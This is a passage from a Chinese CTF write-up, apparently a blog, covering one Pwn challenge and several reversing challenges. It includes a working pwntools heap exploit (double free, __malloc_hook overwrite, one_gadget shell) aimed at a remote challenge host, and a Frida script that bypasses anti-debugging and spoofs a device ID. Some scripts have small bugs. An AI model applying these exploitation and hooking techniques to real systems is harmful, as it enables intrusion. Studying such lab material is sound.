    // case 1
    const uint8_t key[16] = {0x34, 0x35, 0x36, 0x61, 0x66, 0x31, 0x66, 0x32, 0x35, 0x63, 
                  0x62, 0x36, 0x62, 0x36, 0x64, 0x31};
                  
    const uint8_t pt[]={0x54, 0xFB, 0x0F, 0xDB, 0xBB, 0xE5, 0xE3, 0xE8, 0xA8, 0xEA, 
                          0x7D, 0xDE, 0xEA, 0xE6, 0x47, 0xAC, 0x02, 0x06, 0x72, 0x87, 
                          0x5F, 0x93, 0x1C, 0x8C, 0x2B, 0x7A, 0xC5, 0x4F, 0x92, 0x78, 
                          0x72, 0xA9};
                          
    //密文:
          /*
                  0x54, 0xFB, 0x0F, 0xDB, 0xBB, 0xE5, 0xE3, 0xE8, 0xA8, 0xEA, 
                  0x7D, 0xDE, 0xEA, 0xE6, 0x47, 0xAC, 0x02, 0x06, 0x72, 0x87, 
                  0x5F, 0x93, 0x1C, 0x8C, 0x2B, 0x7A, 0xC5, 0x4F, 0x92, 0x78, 
                  0x72, 0xA9
        */
    uint8_t ct[] = {0};
    uint8_t plain[] = {0};


    aesDecrypt(key, 16, pt, plain, 32);       // 解密
        printHex(plain, 32, "after decryption:"); // 打印解密后的明文数据
        

    return 0;
}
```

# Pwn

## [Week3]ez_heap

```Python
from pwn import *
from struct import pack
from ctypes import *
#from LibcSearcher import *
import base64
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
slc = lambda: asm(shellcraft.sh())
uu64 = lambda x: u64(x.ljust(8, b'\0'))
uu32 = lambda x: u32(x.ljust(4, b'\0'))
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))
def pre():
        print(p.recv())
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
def csu(rdi, rsi, rdx, rip, gadget) : return p64(gadget) + p64(0) + p64(1) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - 0x1a)
context(log_level='debug',arch='amd64', os='linux')
#context(log_level='debug',arch='i386', os='linux')
p = remote("210.44.150.15",33925)
#p = process('./attachment')
elf = ELF('./attachment')
libc = ELF('./libc.so.6')
def add(size,content):
  p.sendafter('choice :','1')
  p.sendafter('Note size :',str(size))
  p.sendafter('Content :',content)
  
def add(size):
  p.sendafter('choice :','1')
  p.sendafter('Note size :',str(size))

  
def free(index):
  p.sendafter('choice :','2')
  p.sendafter('Index :',str(index))
 
def show(index):
  p.sendafter('choice :','3')
  p.sendafter('Index :',str(index))

# leak libcbase
add(0x100,b'aaaa')#index 0
add(0x100,b'aaaa')#index 1
free(0)
show(0)
libcbase = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 88 - 0x10 - libc.sym['__malloc_hook']
print(' libcbase -> ', hex(libcbase))
one_gadget = libcbase + 0x4527a
malloc_hook = libcbase + libc.sym['__malloc_hook']
realloc_hook = libcbase + libc.sym['__realloc_hook']
realloc = libcbase + libc.sym['realloc']
system = libcbase + libc.sym['system']
add(0x60, b'bbbbbb') #index 2
add(0x60,b'cccccc')#index 3
free(2)
free(3)
free(2)
add(0x60,p64(malloc_hook-0x23))#index 4
add(0x60, b'bbbbbb')
add(0x60, b'bbbbbb')
#gdb.attach(p)
add(0x60, b'a'*(0x13-8)+p64(one_gadget)+p64(realloc))
#one_gadget
#gdb.attach(p)
#gdb.attach(p)
add1(0x10)
p.interactive()
```



# Rev

## [Week4]easylogin

在调试的时候一直crash，猜测有反调试

在init_array段有函数，进行分析

![260631808b30c27e4100c3523008f64f](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/260631808b30c27e4100c3523008f64f.png)

![c81221afba779b6cc2208fb88a059440](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/c81221afba779b6cc2208fb88a059440.png)

![0b661a84363e185917e3a0a99145340a](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/0b661a84363e185917e3a0a99145340a.png)

发现使用libc中的函数进行了检测

但是是由pthread创建的线程函数中进行检测的，我们可以hook pthread使其最终返回为true

![972025c8bafcde08d86bafadbf6a4e70](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/972025c8bafcde08d86bafadbf6a4e70.png)

主要的判断在这个地方，我们只需要对函数找到偏移量设置寄存器的值使其相等即可

![2708effd9eae9a7ef6e40a6bc813bdbd](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/2708effd9eae9a7ef6e40a6bc813bdbd.png)

过掉检测后即可hook ID使其与预设的id相同了

![img](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/2708effd9eae9a7ef6e40a6bc813bdbd.png)

![23770fb47738454244c7d5bb41b5f008](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/23770fb47738454244c7d5bb41b5f008.png)

Hook X0寄存器的值即可

```JavaScript
function passAnti() {
    Interceptor.attach(Module.getExportByName(null, "pthread_create"), {
        onEnter: function (args) {

            this.funAddr = args[2];
            var instruction = Instruction.parse(this.funAddr.add(0x2b4));
            console.warn("opcode->", instruction.mnemonic);
            if (instruction.mnemonic === "cmp") {
                Interceptor.attach(this.funAddr.add(0x2b4), {
                    onEnter: function (args) {
                        try {
                           // console.log("CMP:", this.context.x24, this.context.x25);
                            this.context.x25 = this.context.x24;
                        } catch (e) {
                            console.log(e);
                        }
                    }
                });
            } else {
                console.log("The instruction is not CMP. Skipping Hook.");
            }

        },
        onLeave: function (retval) {
            // console.log("pthread_create ret");
        }
    });
}

function hook_addr() {
    var baseaddr = Module.getBaseAddress("libeasylogin.so");

    Interceptor.attach(baseaddr.add(0x1F250), {
        onEnter: function (args) {
            try {
                var DeviceID = "a24256ec5983b4a8";
                Memory.writeUtf8String(this.context.x0, DeviceID);
                console.warn("Replace Value of x0:", this.context.x0.readCString());
            } catch (e) {
                console.error("Hook Error of:", e);
            }
        }
    });
}

function hook_dlopenext() {
    passAnti();
    Interceptor.attach(Module.findExportByName("libdl.so", "android_dlopen_ext"), {
        onEnter: function (args) {
            var libName = args[0].readCString(); // 读取库的名称
            console.log("[android_dlopen_ext] -> ", libName);
            
            if (libName.includes("libeasylogin.so")) {
                console.error("[Warning] Detected loading of 'libeasylogin' library!");
                this.check = true; // 标记为 true，供 onLeave 使用
            } else {
                this.check = false; // 非目标库时标记为 false
            }
        },
        onLeave: function (retval) {
            if(this.check){
                console.warn("Hacked!");
                hook_addr();
            }

        }
    });
}

setImmediate(hook_dlopenext);
```

## [Week4]flower

使用pycdas查看字节码，pycdc无法正确反编译

有简单的变量名混淆

写出解密代码

```Python
char_set = "!#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_abcdefghijklmnopqrstuvwxyz{|}"
predefined_string = "?<u1#u1N_z'^%<!RG%G@K0[MMDN<3+y/Xl|Zs%BkA&cFF?dt70#l=-#7rU?a=<6X'|"

bit_buffer = 0
bit_count = 0
encrypted_list = []

for i in range(0, len(predefined_string), 2):
    char1 = char_set.index(predefined_string[i])
    char2 = char_set.index(predefined_string[i + 1])

    buffer_segment = char1 * 91 + char2

    bit_buffer = (bit_buffer << 13) | buffer_segment
    bit_count += 13

    while bit_count >= 8:
        bit_count -= 8
        encrypted_byte = (bit_buffer >> bit_count) & 255
        encrypted_list.append(encrypted_byte)

input_str = ""
for index, value in enumerate(encrypted_list):
    original_char = (value ^ (index << 3) - index) & 255
    input_str += chr(original_char)

print(input_str)
```

## [Week4]Excel CPU

```Python
data_of_all = [
    0xBA5E,  # var_0002
    0xC0DE,  # var_0003
    0xFACE,  # var_0004
    0xF00D,  # var_0005
    0xCAFE,  # var_0006
    0xBABE,  # var_0007
    0xBEEF,  # var_0008
    0xDEAD,  # var_0009
    0x8529,  # var_000A
    0x35F7,  # var_000B
    0xB527,  # var_000C
    0x5556,  # var_000D
    0x9A9A,  # var_000E
    0x2D56,  # var_000F
    0xA3B6,  # var_0010
    0x0A98,  # var_0011
    0xAA76,  # var_0012
    0x8905,  # var_0013
    0x589B,  # var_0014
    0xBDF6,  # var_0015
    0x6A08,  # var_0016
    0x3AF7,  # var_0017
    0xE4A6,  # var_0018
    0x4BFA,  # var_0019
    0x74C9,  # var_001A
    0xE567,  # var_001B
    0x5599,  # var_001C
    0x914B,  # var_001D
    0x2208,  # var_001E
    0x6D7A,  # var_001F
    0xD456,  # var_0020
    0xB8E6,  # var_0021
    0x4478,  # var_0022
    0x9FB7,  # var_0023
    0xB5B8,  # var_0024
    0x4827,  # var_0025
    0xA88D,  # var_0026
    0x4835,  # var_0027
    0xF6CB,  # var_0028
    0xF467,  # var_0029
    0x4536,  # var_002A
    0x3B87,  # var_002B
    0xA656,  # var_002C
    0x56A6,  # var_002D
    0x08B8,  # var_002E
    0x0B5A,  # var_002F
    0x93B9,  # var_0030
    0x96D6,  # var_0031
    0x63C7,  # var_0032
    0xF888,  # var_0033
    0xB786,  # var_0034
    0x5378,  # var_0035
    0x2E68,  # var_0036
]

key = [
    0xBA5E,0xC0DE,0xFACE,0xF00D,0xCAFE,0xBABE,0xBEEF,0xDEAD,
]
enc = [    0x8529,  # var_000A
    0x35F7,  # var_000B
    0xB527,  # var_000C
    0x5556,  # var_000D
    0x9A9A,  # var_000E
    0x2D56,  # var_000F
    0xA3B6,  # var_0010
    0x0A98,  # var_0011
    0xAA76,  # var_0012
    0x8905,  # var_0013
    0x589B,  # var_0014
    0xBDF6,  # var_0015
    0x6A08,  # var_0016
    0x3AF7,  # var_0017
    0xE4A6,  # var_0018
    0x4BFA,  # var_0019
    0x74C9,  # var_001A
    0xE567,  # var_001B
    0x5599,  # var_001C
    0x914B,  # var_001D
    0x2208,  # var_001E
    0x6D7A,  # var_001F
    0xD456,  # var_0020
    0xB8E6,  # var_0021
    0x4478,  # var_0022
    0x9FB7,  # var_0023
    0xB5B8,  # var_0024
    0x4827,  # var_0025
    0xA88D,  # var_0026
    0x4835,  # var_0027
    0xF6CB,  # var_0028
    0xF467,  # var_0029
    0x4536,  # var_002A
    0x3B87,  # var_002B
    0xA656,  # var_002C
    0x56A6,  # var_002D
    0x08B8,  # var_002E
    0x0B5A,  # var_002F
    0x93B9,  # var_0030
    0x96D6,  # var_0031
    0x63C7,  # var_0032
    0xF888,  # var_0033
    0xB786,  # var_0034
    0x5378,  # var_0035
    0x2E68,  # var_0036
]
flag = ''
for i in range(len(enc)):
    data1 = ((enc[i] - key[(10+i) % 8]) & 0xffff) ^ key[enc[i-1] % 8]
    data2 = ((data1 & 0xffff) >> 12) | (data1 << 4)
    flag += chr(data2 & 0xff)
print(flag)
```

汇编转python，调试可知前八个为key

## [Week4]锦锈山河

encrypt里有明显的sm4_cbc加密 我们可以根据传参找到key

![90e100336c0a6394939b98e5a5547721](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/90e100336c0a6394939b98e5a5547721.png)

在函数里有iv的生成方式    **即为rev(key)**  

![cbed25e990ff9f3de14c6806626be0e7](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/cbed25e990ff9f3de14c6806626be0e7.png)

所以iv为：B58F61DDCCC4422DEF6C66EAF8AD815D

密文（emoji）为：

![0ab869d3c9fd409f07852c1727e8d60d](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/0ab869d3c9fd409f07852c1727e8d60d.png)

我们可以根据make_emoji函数里的值写出解密的脚本

```Python
data = []
emoji = "😔😔😡😑😉😒😐😜😢😭😌😳😌😀😠😯😟😶😣😜😡😋😼😴😭😢😫😁😑😐😃😧😶😣😃😼😵😈😦😨😈😡😺😀😤😫😚😷😓😔😇😫😐😸😱😯😰😝😼😮😫😒😵😩😒😶😓😋😸😰😁😑😜😦😸😹😲😕😄😰😗😔😞😑😄😰😀😀"
for i in emoji:
    data.append((ord(i) & 0xFF))
    
v19 = [0]*3
for i in range(0,len(a),4):
    v19[2] = (data[i+3] & 0x3F) | ((data[i+2] & 0x03) << 6)
    v19[1] = ((data[i+2]&0x3c)>>2) | ((data[i+1]&0xf) << 4)
    v19[0] = (data[i]<<2) | ((data[i+1]&0x30)>>4)

    for i in range(len(v19)):
        print(hex(v19[i]), end=',')
```

发现可以对输入后的密文进行解密

![a978c353e4baa0619080bc8c6195ff20](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/a978c353e4baa0619080bc8c6195ff20.png)

但是不能直接把ida里的check emoji解密

猜测对比较的密文进行了修改

动调发现最后的主要判断逻辑在check里，在closure_0函数里有对解密密文的逐位判断

![791cd6312b134a51c0aa4563505b2dda](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/791cd6312b134a51c0aa4563505b2dda.png)

![833844a949889491d3b4946eafeff188](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/833844a949889491d3b4946eafeff188.png)

我们使用idapy获取这个rsp寄存器的值

```Python
import ida_dbg

rsp_value = ida_dbg.get_reg_val("rsp")
target_address = rsp_value + 0x38 - 0x8
value_at_address = idaapi.dbg_read_memory(target_address, 4)

if value_at_address:
    value = int.from_bytes(value_at_address, byteorder='little')
    print(hex(value),end=',')
```

![8e923a144484c64afe7b5bf94d0da1ae](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/8e923a144484c64afe7b5bf94d0da1ae.png)

获取的hex值其实是emoji的hex值

```Python
data = []
emoji = "😡😄😱😨😃😓😘😛😽😅😸😑😂😛😐😿😚😀😌😭😫😘😎😺😫😆😺😣😏😄😳😮😈😈😏😒😐😱😒😴😊😭😰😴😥😪😍😑😎😣😠😷😘😖😆😖😦😿😞😷😥😀😕😁😷😒😀😧😺😤😋😦😶😡😪😪😒😛😭😢😚😅😬😝😱😐😀"
for i in emoji:
    data.append((ord(i) & 0xFF))
    
v19 = [0]*3
for i in range(0,len(a),4):
    v19[2] = (data[i+3] & 0x3F) | ((data[i+2] & 0x03) << 6)
    v19[1] = ((data[i+2]&0x3c)>>2) | ((data[i+1]&0xf) << 4)
    v19[0] = (data[i]<<2) | ((data[i+1]&0x30)>>4)

    for i in range(len(v19)):
        print(hex(v19[i]), end=',')
```

然后我们已知sm4的key和iv，直接cyperchef梭了得到flag

![49847ac3bb801890eb920a59eec6b880](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/49847ac3bb801890eb920a59eec6b880.png)
